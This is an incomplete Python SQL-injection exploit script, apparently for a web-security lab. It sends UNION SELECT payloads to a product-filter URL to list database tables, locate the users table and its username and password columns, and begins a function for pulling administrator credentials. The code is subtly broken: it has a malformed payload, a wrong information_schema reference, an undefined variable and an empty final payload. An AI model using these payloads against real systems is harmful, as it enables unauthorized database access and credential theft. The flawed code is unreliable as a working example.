import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    path = '/filter?category=Accessories'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False
    
def sqli_users_column(url, users_table):
    sql_payload = "*UNION SELECT column_name, NULL FROM information_schema WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sql_payload)
    username_column = soup.find(text=re.compile('.*users.*'))
    password_column = soup.find(text=re.compile('.*password*.'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = ""
    